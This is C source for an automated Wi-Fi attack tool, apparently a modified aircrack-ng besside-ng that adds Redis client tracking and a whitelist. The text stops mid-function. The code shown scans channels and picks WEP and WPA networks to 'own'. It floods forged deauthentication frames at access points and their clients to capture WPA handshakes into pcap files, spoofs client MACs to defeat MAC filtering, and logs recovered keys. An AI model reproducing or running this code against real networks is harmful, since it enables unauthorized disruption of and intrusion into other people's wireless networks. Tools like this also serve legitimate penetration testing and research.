/*
 *  Copyright (C) 2010 Andrea Bittau <bittau@cs.stanford.edu>
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 *
 *
 *  In addition, as a special exception, the copyright holders give
 *  permission to link the code of portions of this program with the
 *  OpenSSL library under certain conditions as described in each
 *  individual source file, and distribute linked combinations
 *  including the two.
 *  You must obey the GNU General Public License in all respects
 *  for all of the code used other than OpenSSL. *  If you modify
 *  file(s) with this exception, you may extend this exception to your
 *  version of the file(s), but you are not obligated to do so. *  If you
 *  do not wish to do so, delete this exception statement from your
 *  version. *  If you delete this exception statement from all source
 *  files in the program, then also delete it here.
 */

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <getopt.h>
#include <err.h>
#include <signal.h>
#include <string.h>
#include <assert.h>
#include <time.h>
#include <stdarg.h>
#include <errno.h>
#include <netdb.h>
#include <unistd.h>
#include <hiredis.h>

#ifdef HAVE_PCRE
#include <pcre.h>
#endif

#include "aircrack-ng.h"
#include "version.h"
#include "aircrack-ptw-lib.h"
#include "osdep/osdep.h"
#include "ieee80211.h"
#include "crypto.h"
#include "pcap.h"

#ifdef UNUSED
#elif defined(__GNUC__)
# define UNUSED(x) UNUSED_ ## x __attribute__((unused))
#elif defined(__LCLINT__)
# define UNUSED(x) /*@unused@*/ x
#else
# define UNUSED(x) x
#endif

typedef int bool;
#define true 1
#define false 0

static unsigned char ZERO[32] =
"\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00";

int PTW_DEFAULTBF[PTW_KEYHSBYTES] = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
			      0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };

enum {
	STATE_SCAN = 0,
	STATE_ATTACK,
	STATE_DONE,
};

enum {
	CRYPTO_NONE = 0,
	CRYPTO_WEP,
	CRYPTO_WPA,
	CRYPTO_WPA_MGT,
};

enum {
	ASTATE_NONE = 0,
	ASTATE_PING,
	ASTATE_READY,

	ASTATE_DEAUTH,
	ASTATE_WPA_CRACK,

	ASTATE_WEP_PRGA_GET,
	ASTATE_WEP_FLOOD,

	ASTATE_DONE,
	ASTATE_UNREACH,
};

enum {
	WSTATE_NONE = 0,
	WSTATE_AUTH,
	WSTATE_ASSOC,
};

enum {
	V_NORMAL = 0,
	V_VERBOSE,
};

struct cracker;
struct network;

typedef void (*timer_cb)(void*);
typedef void (*cracker_cb)(struct cracker *, struct network *n);
typedef int (*check_cb)(struct network *n);

struct channel {
	int		c_num;
	struct channel	*c_next;
};

struct conf {
	char		*cf_ifname;
	struct channel	cf_channels;
	int		cf_hopfreq;
	int		cf_deauthfreq;
	unsigned char	*cf_bssid;
	int		cf_attackwait;
	int		cf_floodwait;
	char		*cf_wordlist;
	int		cf_verb;
	int		cf_to;
	int		cf_floodfreq;
	int		cf_crack_int;
	char		*cf_wpa;
	char		*cf_wep;
	char		*cf_log;
	int		cf_do_wep;
	int		cf_do_wpa;
    bool    cf_5ghz;
	int		cf_autochan;
#ifdef HAVE_PCRE
    pcre *cf_essid_regex;
#endif
} _conf;

struct timer {
	struct timeval	t_tv;
	timer_cb	t_cb;
	void		*t_arg;
	struct timer	*t_next;
};

struct packet {
	unsigned char	p_data[2048];
	int		p_len;
};

struct client {
	unsigned char	c_mac[6];
	int		c_wpa;
	int		c_wpa_got;
	int		c_dbm;
	struct packet	c_handshake[4];
	struct client	*c_next;
};

struct speed {
	unsigned int	s_num;
	struct timeval	s_start;
	unsigned int	s_speed;
};

struct cracker {
	int cr_pid;
	int cr_pipe[2];
};

struct network {
	char		n_ssid[256];
	unsigned char	n_bssid[6];
	int		n_crypto;
	int		n_chan;
	struct network	*n_next;
	struct network	*n_previous;
	struct timeval	n_start;
	int		n_have_beacon;
	struct client	n_clients;
	int		n_astate;
	int		n_wstate;
	unsigned short	n_seq;
	int		n_dbm;
	int		n_ping_sent;
	int		n_ping_got;
	int		n_attempts;
	unsigned char	n_prga[2048];
	int		n_prga_len;
	unsigned char	n_replay[2048];
	int		n_replay_len;
	int		n_replay_got;
	struct timeval	n_replay_last;
	struct speed	n_flood_in;
	struct speed	n_flood_out;
	int		n_data_count;
	int		n_crack_next;
	PTW_attackstate	*n_ptw;
	struct cracker	n_cracker_wep[2];
	unsigned char	n_key[64];
	int		n_key_len;
	struct packet	n_beacon;
	int		n_beacon_wrote;
	struct client	*n_client_handshake;
	int		n_mac_filter;
	struct client	*n_client_mac;
	int		n_got_mac;
};

struct state {
	struct wif	*s_wi;
	int		s_state;
	struct timeval	s_now;
	struct timeval	s_start;
	struct network	s_networks;
	struct network	*s_curnet;
	struct channel	*s_hopchan;
	unsigned int	s_hopcycles;
	int		s_chan;
	unsigned char	s_mac[6];
	struct timer	s_timers;
	struct rx_info	*s_ri;
	int		s_wpafd;
	int		s_wepfd;
} _state;

static void autodetect_channels();


redisContext *redis_context;


static void attack_continue(struct network *n);
static void attack(struct network *n);

void show_wep_stats(int UNUSED(B), int UNUSED(force),
		    PTW_tableentry UNUSED(table[PTW_KEYHSBYTES][PTW_n]),
		    int UNUSED(choices[KEYHSBYTES]),
		    int UNUSED(depth[KEYHSBYTES]),
		    int UNUSED(prod))
{
}

static void time_printf(int verb, char *fmt, ...)
{
	time_t now = _state.s_now.tv_sec;
	struct tm *t;
	va_list ap;

	if (verb > _conf.cf_verb)
		return;

	t = localtime(&now);
	if (!t)
		err(1, "localtime()");

	printf("\e[K");
        printf("[%.2d:%.2d:%.2d] ", t->tm_hour, t->tm_min, t->tm_sec);

	va_start(ap, fmt);
	vprintf(fmt, ap);
	va_end(ap);
}

static void cracker_kill(struct cracker *c)
{
	if (c->cr_pid) {
		kill(c->cr_pid, SIGKILL);

		if (c->cr_pipe[0])
			close(c->cr_pipe[0]);
	}

	memset(c, 0, sizeof(*c));
}

static char *mac2str(unsigned char *mac)
{
	static char out[18];

	snprintf(out, sizeof(out), "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x",
	         mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

	return out;
}

static void save_network(FILE *f, struct network *n)
{
	int len;

	if (n->n_crypto != CRYPTO_WPA && n->n_crypto != CRYPTO_WEP)
		return;

	if (!n->n_have_beacon)
		return;

	if (n->n_astate != ASTATE_DONE)
		return;

	len = strlen(n->n_ssid);

	fprintf(f, "%s", n->n_ssid);

	while (len++ < 20)
		fprintf(f, " ");

	fprintf(f, "| ");
	len = 0;
	if (n->n_key_len) {
		for (len = 0; len < n->n_key_len; len++) {
			if (len != 0)
				fprintf(f, ":");

			fprintf(f, "%.2x", n->n_key[len]);
		}

		len = n->n_key_len * 3 - 1;
	}

	if (n->n_client_handshake) {
		fprintf(f, "Got WPA handshake");
		len = 17;
	}

	if (n->n_astate == ASTATE_UNREACH) {
		fprintf(f, "Crappy connection");
		len = 17;
	}

	while (len++ < 38)
		fprintf(f, " ");

	fprintf(f, " | %s", mac2str(n->n_bssid));

	fprintf(f, " | ");
	if (n->n_got_mac)
		fprintf(f, "%s", mac2str(n->n_client_mac->c_mac));

	fprintf(f, "\n");
}

static void save_log(void)
{
	FILE *f;
	struct network *n = _state.s_networks.n_next;

	f = fopen(_conf.cf_log, "w");
	if (!f)
		err(1, "fopen()");

	fprintf(f, "# SSID              ");
	fprintf(f, "| KEY                                    | BSSID");
	fprintf(f, "             | MAC filter\n");

	while (n) {
		save_network(f, n);
		n = n->n_next;
	}

	fclose(f);
}

static void do_wait(int UNUSED(x))
{
	wait(NULL);
}

#if 0
static inline void hexdump(void *p, int len)
{
	unsigned char *x = p;

	while (len--)
		printf("%.2x ", *x++);

	printf("\n");
}
#endif

static void *xmalloc(size_t sz)
{
	void *p = malloc(sz);

	if (!p)
		err(1, "malloc()");

	return p;
}

static int time_diff(struct timeval *past, struct timeval *now)
{
	int p = 0, n = 0;

	if (now->tv_sec > past->tv_sec)
		n = (now->tv_sec - past->tv_sec) * 1000 * 1000;
	else
		p = (past->tv_sec - now->tv_sec) * 1000 * 1000;

	n += now->tv_usec;
	p += past->tv_usec;

	return n - p;
}

#if 0
static inline void timer_print(void)
{
	int i = 0;
	struct timer *t = _state.s_timers.t_next;

	printf(
			#if !defined( __APPLE_CC__) && !defined(__NetBSD__) && !defined(__OpenBSD__)
			"\nNow %lu.%lu\n",
			#else
			"\nNow %lu.%d\n",
			#endif
			_state.s_now.tv_sec, _state.s_now.tv_usec);

	while (t) {

		printf(
				#if !defined( __APPLE_CC__) && !defined(__NetBSD__) && !defined(__OpenBSD__)
				"%d) %lu.%lu %p(%p)\n",
				#else
				"%d) %lu.%d %p(%p)\n",
				#endif
		       i++,
		       t->t_tv.tv_sec,
		       t->t_tv.tv_usec,
		       t->t_cb,
		       t->t_arg);

		t = t->t_next;
	}
}
#endif

/*
 * it seems at increments timeval using now to go forward with timers in s_timers.
 *
 */
static void timer_next(struct timeval *tv)
{
	struct timer *t = _state.s_timers.t_next;
	int diff;

	if (!t) {
		tv->tv_sec  = 1;
		tv->tv_usec = 0;
		return;
	}

	diff = time_diff(&_state.s_now, &t->t_tv);
	if (diff <= 0) {
		tv->tv_sec  = 0;
		tv->tv_usec = 0;
		return;
	}

	tv->tv_sec  = diff / (1000 * 1000);
	tv->tv_usec = diff - (tv->tv_sec * 1000 * 1000);
}

/*
 * timer_in add a timer to the _stimers list.
 * @us microseconds
 * @timer_cb timer call back
 * @arg callback arg
 */
static void timer_in(int us, timer_cb cb, void *arg)
{
	struct timer *t = xmalloc(sizeof(*t));
	struct timer *p = &_state.s_timers;
	int s;

	memset(t, 0, sizeof(*t));

	t->t_cb  = cb;
	t->t_arg = arg;
	t->t_tv  = _state.s_now;

	t->t_tv.tv_usec += us;

	s = t->t_tv.tv_usec / (1000 * 1000);
	t->t_tv.tv_sec  += s;
	t->t_tv.tv_usec -= s * 1000 * 1000;

    // insert sort using time_diff
	while (p->t_next) {
		if (time_diff(&t->t_tv, &p->t_next->t_tv) > 0) {
			break;
        }

		p = p->t_next;
	}

	t->t_next = p->t_next;
	p->t_next = t;
}

/*
 * Iterates on the timers list and call the callback of the timer
 * if the time diff is small it will skip and delete the timer since
 * it already expired
 */
static void timer_check(void)
{
//	timer_print();

	struct timer *t = _state.s_timers.t_next;
	while (_state.s_timers.t_next) {
		struct timer *previous = t;
        t = _state.s_timers.t_next;

		if (time_diff(&t->t_tv, &_state.s_now) < 0) {
		    //free(t);
			break;
        }

		_state.s_timers.t_next = t->t_next;

		t->t_cb(t->t_arg);

		//free(t);
	}
}

static unsigned char *get_bssid(struct ieee80211_frame *wh)
{
	int type = wh->i_fc[0] & IEEE80211_FC0_TYPE_MASK;
	uint16_t *p = (uint16_t*) (wh + 1);

	if (type == IEEE80211_FC0_TYPE_CTL)
		return NULL;

	if (wh->i_fc[1] & IEEE80211_FC1_DIR_TODS)
		return wh->i_addr1;
	else if (wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS)
		return wh->i_addr2;

	// XXX adhoc?
	if (type == IEEE80211_FC0_TYPE_DATA)
		return wh->i_addr1;

	switch (wh->i_fc[0] & IEEE80211_FC0_SUBTYPE_MASK) {
	case IEEE80211_FC0_SUBTYPE_ASSOC_REQ:
	case IEEE80211_FC0_SUBTYPE_REASSOC_REQ:
	case IEEE80211_FC0_SUBTYPE_DISASSOC:
		return wh->i_addr1;

	case IEEE80211_FC0_SUBTYPE_AUTH:
		/* XXX check len */
		switch (le16toh(p[1])) {
		case 1:
		case 3:
			return wh->i_addr1;

		case 2:
		case 4:
			return wh->i_addr2;
		}
		return NULL;

	case IEEE80211_FC0_SUBTYPE_ASSOC_RESP:
	case IEEE80211_FC0_SUBTYPE_REASSOC_RESP:
	case IEEE80211_FC0_SUBTYPE_PROBE_RESP:
	case IEEE80211_FC0_SUBTYPE_BEACON:
	case IEEE80211_FC0_SUBTYPE_DEAUTH:
		return wh->i_addr2;

	case IEEE80211_FC0_SUBTYPE_PROBE_REQ:
	default:
		return NULL;
	}
}

static struct network *network_get(struct ieee80211_frame *wh)
{
    /*
     * Search on the seens networks. if not found it retuns none
     */
	struct network *n    = _state.s_networks.n_next;
	unsigned char *bssid = get_bssid(wh);

	if (!bssid)
		return NULL;

	while (n) {
		if (memcmp(n->n_bssid, bssid, sizeof(n->n_bssid)) == 0)
			return n;

		n = n->n_next;
	}

	return NULL;
}

static struct network *network_new(void)
{
	struct network *n = xmalloc(sizeof(*n));

	memset(n, 0, sizeof(*n));
	n->n_crack_next = _conf.cf_crack_int;

	return n;
}

static void do_network_add(struct network *n)
{
    /*
     * Add the network to the list.
     */
	struct network *last = &_state.s_networks;

	while (last->n_next)
		last = last->n_next;

	last->n_next = n;
    n->n_previous = last;
}

static void found_new_client(struct network *n, struct client *c)
{
    char *clients_key;
    char *redis_cmd;
    int len;
    redisReply *reply;

	time_printf(
        V_VERBOSE,
        "Found client for network [%s] %s\n",
        n->n_ssid,
        mac2str(n->n_bssid)
    );

    len = snprintf(NULL, 0, "clients_%s", mac2str(n->n_bssid));
    clients_key = (char *) malloc(len + 1);
    sprintf(clients_key, "clients_%s", mac2str(n->n_bssid));
    len = snprintf(NULL, 0, "SADD %s %s", clients_key, mac2str(c->c_mac));
    redis_cmd = (char *) malloc(len +  1);
    sprintf(redis_cmd, "SADD %s %s", clients_key, mac2str(c->c_mac));
    reply = redisCommand(redis_context, redis_cmd);
    freeReplyObject(reply);
    free(clients_key);
    free(redis_cmd);

	if (n->n_mac_filter && !n->n_client_mac)
		attack_continue(n);

}

static void attach_client_to_network(struct network *n, unsigned char *cmac) {
    struct client *c;

    c = xmalloc(sizeof(*c));

    memset(c, 0, sizeof(*c));

    memcpy(c->c_mac, cmac, sizeof(c->c_mac));
    c->c_next = n->n_clients.c_next;
    n->n_clients.c_next = c;

    if (n->n_have_beacon &&
        (n->n_crypto == CRYPTO_WPA || n->n_crypto == CRYPTO_WEP))
        found_new_client(n, c);

}

static bool find_client_on_network(struct network *n, char *current_mac) {
	struct client *c = n->n_clients.c_next;
	while (c) {
        if (memcmp(c->c_mac, current_mac, 6) == 0)
            return true;
		c = c->c_next;
	}
    return false;
}

static void add_clients_from_redis(struct network *n) {
    /*
     * Searchs for clients from redis and adds them to the clients list of the network in memory
     */
    int len, i;
    char *clients_key;
    char *redis_cmd;
    redisReply *reply;

    len = snprintf(NULL, 0, "clients_%s", mac2str(n->n_bssid));
    clients_key = (char *) malloc(len + 1);
    sprintf(clients_key, "clients_%s", mac2str(n->n_bssid));
    len = snprintf(NULL, 0, "SMEMBERS %s", clients_key);
    redis_cmd = (char *) malloc(len +  1);
    sprintf(redis_cmd, "SMEMBERS %s", clients_key);
    reply = redisCommand(redis_context, redis_cmd);
    for (i=0; i<reply->elements; i++) {
        if (!find_client_on_network(n, reply->element[i]->str)) {
            attach_client_to_network(n, reply->element[i]->str);
        }
    }

    freeReplyObject(reply);
    free(clients_key);
    free(redis_cmd);
}

static struct network *network_add(struct ieee80211_frame *wh)
{
    /*
     * Adds a new network to the struct.
     */
	struct network *n;
	unsigned char *bssid = get_bssid(wh);

	if (!bssid)
		return NULL;

	n = network_new();

	memcpy(n->n_bssid, bssid, sizeof(n->n_bssid));
    add_clients_from_redis(n);
    // add it to the list.
	do_network_add(n);

	return n;
}

static inline void print_hex(void *p, int len)
{
	unsigned char *x = p;

	while (len--) {
		printf("%.2x", *x++);
		if (len)
			printf(":");
	}
}

static const char *crypto_to_string(struct network *n){
	const char *crypto = "dunno";

	switch (n->n_crypto) {
	case CRYPTO_NONE:
		crypto = "open";

		break;

	case CRYPTO_WEP:
		crypto = "wep";

		break;

	case CRYPTO_WPA:
		crypto = "wpa";

		break;

	case CRYPTO_WPA_MGT:
		crypto = "wpa2";
		break;
	}

    return crypto;
}

static void network_print(struct network *n)
{
	const char *crypto = crypto_to_string(n);

	time_printf(V_VERBOSE,
		    "Found AP %s [%s] chan %d crypto %s dbm %d\n",
		    mac2str(n->n_bssid), n->n_ssid, n->n_chan, crypto,
		    n->n_dbm);
}

static void channel_set(int num)
{
	if (wi_set_channel(_state.s_wi, num) == -1)
		err(1, "wi_set_channel()");

	_state.s_chan = num;
}

static unsigned short fnseq(unsigned short fn, unsigned short seq)
{
        unsigned short r = 0;

	assert(fn < 16);

        r = fn;

        r |= ((seq % 4096) << IEEE80211_SEQ_SEQ_SHIFT);

        return htole16(r);
}

static void fill_basic(struct network *n, struct ieee80211_frame *wh)
{
	uint16_t *p;

	memset(wh, 0, sizeof(*wh));

	p  = (uint16_t*) wh->i_dur;
	*p = htole16(32767);

	p  = (uint16_t*)wh->i_seq;
	*p = fnseq(0, n->n_seq++);
}

static void wifi_send(void *p, int len)
{
	int rc;
	struct tx_info tx;

	memset(&tx, 0, sizeof(tx));

	rc = wi_write(_state.s_wi, p, len, &tx);
	if (rc == -1)
		err(1, "wi_write()");
}

static void deauth_send(struct network *n, unsigned char *mac)
{
	unsigned char buf[2048];
	struct ieee80211_frame *wh = (struct ieee80211_frame*) buf;
	uint16_t *rc = (uint16_t*) (wh + 1);

	fill_basic(n, wh);
	memcpy(wh->i_addr1, mac, sizeof(wh->i_addr1));
	memcpy(wh->i_addr2, n->n_bssid, sizeof(wh->i_addr2));
	memcpy(wh->i_addr3, n->n_bssid, sizeof(wh->i_addr3));

	wh->i_fc[0] |= IEEE80211_FC0_TYPE_MGT | IEEE80211_FC0_SUBTYPE_DEAUTH;

	*rc++ = htole16(7);

	time_printf(V_VERBOSE, "Sending deauth to %s\n", mac2str(mac));

	wifi_send(wh, (unsigned long) rc - (unsigned long) wh);
}

static void deauth(void *arg)
{
	struct network *n = arg;
	struct client *c = n->n_clients.c_next;

	if (_state.s_state != STATE_ATTACK
	    || _state.s_curnet != n
	    || n->n_astate != ASTATE_DEAUTH)
		return;

	deauth_send(n, BROADCAST);

	while (c) {
		deauth_send(n, c->c_mac);
		c = c->c_next;
	}

	timer_in(_conf.cf_deauthfreq * 1000, deauth, n);
}

static int open_pcap(char *fname)
{
	int fd;
        struct pcap_file_header pfh;

	fd = open(fname, O_RDWR | O_APPEND);
	if (fd != -1) {
		time_printf(V_NORMAL, "Appending to %s\n", fname);
		return fd;
	}

	memset(&pfh, 0, sizeof(pfh));
	pfh.magic           = TCPDUMP_MAGIC;
	pfh.version_major   = PCAP_VERSION_MAJOR;
	pfh.version_minor   = PCAP_VERSION_MINOR;
	pfh.thiszone        = 0;
	pfh.sigfigs         = 0;
	pfh.snaplen         = 65535;
	pfh.linktype        = LINKTYPE_IEEE802_11;

        fd = open(fname, O_WRONLY | O_CREAT,
                  S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
	if (fd == -1)
		err(1, "open(%s)", fname);

	if (write(fd, &pfh, sizeof(pfh)) != sizeof(pfh))
		err(1, "write()");

	return fd;
}

static void write_pcap(int fd, void *p, int len)
{
        struct pcap_pkthdr pkh;

        memset(&pkh, 0, sizeof(pkh));

        pkh.caplen  = pkh.len = len;
	pkh.tv_sec  = _state.s_now.tv_sec;
	pkh.tv_usec = _state.s_now.tv_usec;

	if (write(fd, &pkh, sizeof(pkh)) != sizeof(pkh))
		err(1, "write()");

	if (write(fd, p, len) != len)
		err(1, "write()");
}

static void packet_write_pcap(int fd, struct packet *p)
{
	write_pcap(fd, p->p_data, p->p_len);
}

static void save_handshakes(struct network *n)
{
    int i;
    printf("saving handshakes");

	_state.s_wpafd = open_pcap(_conf.cf_wpa);

    packet_write_pcap(_state.s_wpafd, &n->n_beacon);

    for (i = 0; i < 4; i++) {
        struct packet *p = &n->n_client_handshake->c_handshake[i];

        if (p->p_len)
            packet_write_pcap(_state.s_wpafd, p);
    }

	close(_state.s_wpafd);
    n->n_astate = ASTATE_DONE;
    attack_continue(n);
}

static void attack_wpa(struct network *n)
{
	switch (n->n_astate) {
        case ASTATE_READY:
            n->n_astate = ASTATE_DEAUTH;
            /* fallthrough */
        case ASTATE_DEAUTH:
            deauth(n);
            break;
        case ASTATE_WPA_CRACK:
            break;
	}
}

static void hop(void *arg)
{
	int old = _state.s_chan;

    // Avoid changing the channel on different state
	if (_state.s_state != STATE_SCAN)
		return;

	while (1) {
		struct channel *c = _state.s_hopchan->c_next;

		if (c->c_num == old)
			break;

		// skip unsupported chan.  XXX check if we run out.
		if (wi_set_channel(_state.s_wi, c->c_num) == -1) {
			_state.s_hopchan->c_next = c->c_next;
			//free(c);
		} else
			break;
	}

	_state.s_hopchan = _state.s_hopchan->c_next;
	_state.s_chan    = _state.s_hopchan->c_num;

	// XXX assume we don't lose head
	if (_state.s_hopchan == _conf.cf_channels.c_next)
		_state.s_hopcycles++;

	timer_in(_conf.cf_hopfreq * 1000, hop, arg);
}

static void scan_start(void)
{
	_state.s_state	   = STATE_SCAN;
	_state.s_hopcycles = 0;

	hop(NULL); /* XXX check other hopper */
}

static void send_auth(struct network *n)
{
	unsigned char buf[2048];
	struct ieee80211_frame *wh = (struct ieee80211_frame*) buf;
	uint16_t *rc = (uint16_t*) (wh + 1);

	fill_basic(n, wh);
	memcpy(wh->i_addr1, n->n_bssid, sizeof(wh->i_addr1));
	memcpy(wh->i_addr2, _state.s_mac, sizeof(wh->i_addr2));
	memcpy(wh->i_addr3, n->n_bssid, sizeof(wh->i_addr3));

	wh->i_fc[0] |= IEEE80211_FC0_TYPE_MGT | IEEE80211_FC0_SUBTYPE_AUTH;

	*rc++ = htole16(0);
	*rc++ = htole16(1);
	*rc++ = htole16(0);

	wifi_send(wh, (unsigned long) rc - (unsigned long) wh);
}

static void ping_send(struct network *n)
{
	send_auth(n);

	time_printf(V_VERBOSE, "Sending ping to %s\n", n->n_ssid);

	n->n_ping_sent++;
}

static void ping_reply(struct network *n, struct ieee80211_frame *wh)
{
	uint16_t* p = (uint16_t*) (wh + 1);

	if (le16toh(p[1]) == 2)	{
		time_printf(V_VERBOSE, "Ping reply %s\n", n->n_ssid);
		n->n_ping_got++;
	}
}

static void set_mac(void *mac)
{
	if (memcmp(mac, _state.s_mac, 6) == 0)
		return;
#if 0
	if (wi_set_mac(_state.s_wi, mac) == -1)
			err(1, "wi_set_mac()");
#endif
	time_printf(V_VERBOSE, "Can't set MAC - this'll suck."
		    " Set it manually to %s for best performance.\n",
		    mac2str(mac));

	memcpy(_state.s_mac, mac, 6);
}

static int have_mac(struct network *n)
{
	if (!n->n_mac_filter)
		return 1;

	/* XXX try different clients based on feedback */
	if (!n->n_client_mac)
		n->n_client_mac = n->n_clients.c_next;

	if (!n->n_client_mac)
		return 0;

	set_mac(n->n_client_mac->c_mac);

	return 1;
}

static void attack_ping(void *a)
{
	struct network *n = a;

	if (_state.s_state != STATE_ATTACK || _state.s_curnet != n)
		return;

	if (n->n_ping_sent == 10) {
		int got  = n->n_ping_got;
		int sent = n->n_ping_sent;
		int loss = 100 - ((double) got / (double) sent * 100.0);

		if (loss < 0)
			loss = 0;

		time_printf(V_VERBOSE,
			    "Ping results for %s %d/%d (%d%% loss)\n",
			    n->n_ssid, got, sent, loss);

		if (loss >= 80) {
			time_printf(V_NORMAL,
				    "Crappy connection - %s unreachable"
				    " got %d/%d (%d%% loss) [%d dbm]\n",
				    n->n_ssid, got, sent, loss, n->n_dbm);

			n->n_astate = ASTATE_UNREACH;
		} else
			n->n_astate = ASTATE_READY;

		attack_continue(n);
		return;
	}

	ping_send(n);

	timer_in(100 * 1000, attack_ping, n);
}

#ifdef HAVE_PCRE
int is_filtered_essid(char *essid)
{
    int ret = 0;

    if(_conf.cf_essid_regex)
    {
        return pcre_exec(_conf.cf_essid_regex, NULL, (char*)essid, strnlen((char *)essid, MAX_IE_ELEMENT_SIZE), 0, 0, NULL, 0) < 0;
    }

    return ret;
}
#endif

static int check_white_list(struct network *n) {
    int i, len;
    char *current_bssid;
    char *format;
    char *redis_cmd;
    redisReply *reply;

    format = "SISMEMBER bssid_white_list %s";
    len = snprintf(NULL, 0, format, mac2str(n->n_bssid));
    redis_cmd = (char *)malloc(len + 1);
    sprintf(redis_cmd, format, mac2str(n->n_bssid));
    //printf(redis_cmd);
    //printf("\n");
    reply = redisCommand(redis_context, redis_cmd);
    free(redis_cmd);
    if ( reply->integer == 1) {
        freeReplyObject(reply);
        //printf("----\n");
        //printf(mac2str(n->n_bssid));
        //printf("\n----");
        //printf("ALREADY FOUND!!! \n");
        return 1;
    }
    freeReplyObject(reply);
    return 0;
}

static int should_attack(struct network *n)
{
    if (check_white_list(n) == 1) {
        return 0;
    }

	if (_conf.cf_bssid
	    && memcmp(_conf.cf_bssid , n->n_bssid, 6) != 0)
		return 0;

#ifdef HAVE_PCRE
    if (is_filtered_essid(n->n_ssid)) {
        return 0;
    }
#endif

    if (!n->n_have_beacon)
		return 0;

	switch (n->n_astate) {
	case ASTATE_DONE:
	case ASTATE_UNREACH:
		if (_conf.cf_bssid)
			_state.s_state = STATE_DONE;
		return 0;
	}

	if (n->n_crypto != CRYPTO_WEP && n->n_crypto != CRYPTO_WPA)
		return 0;

	if (!_conf.cf_do_wep && n->n_crypto == CRYPTO_WEP)
		return 0;

	return 1;
}

static int check_ownable(struct network *n)
{
	return should_attack(n);
}

static int check_owned(struct network *n)
{
	if (n->n_beacon.p_len == 0)
		return 0;
    if (check_white_list(n) == 1)
        return 1;
	return n->n_astate == ASTATE_DONE;
}

static int check_unreach(struct network *n)
{
	return n->n_astate == ASTATE_UNREACH;
}

static void print_list(char *label, check_cb cb)
{
	struct network *n = _state.s_networks.n_next;
	int first = 1;

	printf("%s [", label);

	while (n) {
		if (cb(n)) {
			if (first)
				first = 0;
			else
				printf(", ");

			printf("%s", n->n_ssid);
			if (n->n_crypto == CRYPTO_WPA)
				printf("*");
		}
		n = n->n_next;
	}

	printf("]");
}

static void print_work(void)
{
	time_printf(V_NORMAL, "");

	print_list("TO-OWN", check_ownable);
	print_list(" OWNED", check_owned);
	if (_conf.cf_verb > V_NORMAL)
		print_list(" UNREACH", check_unreach);

	printf("\n");

	save_log();
}

static void free_network(struct network *n) {
	struct client *to_free_client;
    struct client *current_client = n->n_clients.c_next;
    printf("Freeing %s \n", n->n_ssid);
    while (current_client) {
        to_free_client = current_client;
        current_client = current_client->c_next;
        free(to_free_client);
    }
    n->n_previous->n_next = n->n_next;
    n->n_next->n_previous = n->n_previous;
    free(n->n_client_mac);
    free(n->n_client_handshake);
    free(n);
}

static void clean_old() {
    struct network *to_free_network;
    struct network *current_network = _state.s_networks.n_next;
    while (current_network) {
        int s = (_state.s_now.tv_sec - current_network->n_start.tv_sec);
        int m = s / 60;

        s -= m * 60;
        printf("Minutes since last attack %d \n", s);
        if ( m > 5) {
            printf("Cleaning up AP\n");
            to_free_network = current_network;
            current_network = current_network->n_next;
            free_network(to_free_network);
        } else {
            current_network = current_network->n_next;
        }
    }
}

static void pwned(struct network *n)
{
	int s = (_state.s_now.tv_sec - n->n_start.tv_sec);
	int m = s / 60;

	s -= m * 60;

	time_printf(V_NORMAL,
		    "Pwned network %s in %d:%.2d mins:sec\n", n->n_ssid, m, s);

	n->n_astate = ASTATE_DONE;

	print_work();
}

static struct network *attack_get(void)
{
	struct network *n = _state.s_networks.n_next, *start;

	if (_state.s_curnet && _state.s_curnet->n_next)
		n = _state.s_curnet->n_next;

	start = n;

	while (n) {
		if (should_attack(n))
			return n;

		n = n->n_next;
		if (n == NULL) {
			/* reached head, lets scan for a bit */
			if (_state.s_state == STATE_ATTACK)
				return NULL;

			n = _state.s_networks.n_next;
		}
		if (n == start)
			break;
	}

	return NULL;
}

static void attack_next(void)
{
	struct network *n;

	if ((n = attack_get())) {
		attack(n);
		return;
	}

	if (_state.s_state == STATE_DONE)
		return;

	/* we aint got people to pwn */
	if (_state.s_state == STATE_ATTACK)
		scan_start();
}

static int watchdog_next(struct network *n)
{
	if (n->n_crypto == CRYPTO_WEP
	    && n->n_astate == ASTATE_WEP_FLOOD
	    && n->n_replay_got) {
		int diff;
		int to = _conf.cf_floodwait * 1000 * 1000;

		diff = time_diff(&n->n_replay_last, &_state.s_now);

		if (diff < to)
			return to - diff;
	}

	return 0;
}

static void attack_watchdog(void *arg)
{
	struct network *n = arg;
	int next;

	if (_state.s_state != STATE_ATTACK || _state.s_curnet != n)
		return;

	next = watchdog_next(n);

	if (next == 0) {
		time_printf(V_VERBOSE, "Giving up on %s for now\n", n->n_ssid);
		attack_next();
	} else
		timer_in(next, attack_watchdog, n);
}

static void network_auth(void *a)
{
	struct network *n = a;

	if (_state.s_state != STATE_ATTACK ||
	    _state.s_curnet != n
	    || n->n_wstate != WSTATE_NONE)
		return;

	if (!have_mac(n))
		return;

	time_printf(V_VERBOSE, "Authenticating...\n");

	send_auth(n);

	timer_in(_conf.cf_to * 1000, network_auth, n);
}

static void do_assoc(struct network *n, int stype)
{
	unsigned char buf[2048];
	struct ieee80211_frame *wh = (struct ieee80211_frame*) buf;
	uint16_t *rc = (uint16_t*) (wh + 1);
	unsigned char *p;

	fill_basic(n, wh);
